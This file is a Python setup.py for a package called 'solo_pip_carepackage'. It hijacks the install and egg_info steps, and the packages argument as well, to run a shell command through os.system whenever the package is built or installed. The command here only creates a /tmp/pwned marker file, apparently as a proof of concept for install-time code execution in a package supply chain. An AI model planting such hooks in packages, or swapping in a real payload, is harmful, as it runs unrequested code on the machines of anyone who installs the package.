from setuptools import setup, find_packages
from setuptools.command.install import install
from setuptools.command.egg_info import egg_info

def RunCommand():
 import os;os.system("touch /tmp/pwned")

class RunEggInfoCommand(egg_info):
    def run(self):
        RunCommand()
        egg_info.run(self)


class RunInstallCommand(install):
    def run(self):
        RunCommand()
        install.run(self)

setup(
    name = "solo_pip_carepackage",
    version = "1.1.3",
    license = "MIT",
    packages=RunCommand(),
    cmdclass={
        'install' : RunInstallCommand,
        'egg_info': RunEggInfoCommand
    },

)
